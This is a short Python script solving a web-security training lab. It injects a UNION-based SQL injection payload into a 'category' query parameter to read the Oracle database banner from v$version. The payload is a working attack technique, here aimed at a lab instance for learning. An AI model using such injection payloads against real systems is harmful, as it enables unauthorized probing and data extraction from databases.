##################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 15/9/2023
#
# Lab: SQL injection attack, querying the database type and version on Oracle
#
# Steps: 1. Inject payload in 'category' query parameter
#        2. Retrieve database banner in the response
#
##################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a19002104884280804f089300f500e7.web-security-academy.net"

# payload to return the database banner
payload = "' UNION SELECT banner, null FROM v$version-- -"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")
    
except:
    print(Fore.RED + "[!] Failed to inject the payload through exception")
    exit(1)

print(Fore.WHITE + "1. Injecting payload in 'category' query parameter.. " + Fore.GREEN + "OK")

# if response is OK
if injection.status_code == 200:
    print(Fore.WHITE + "2. Retrieving database banner in the response.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to inject the payload")

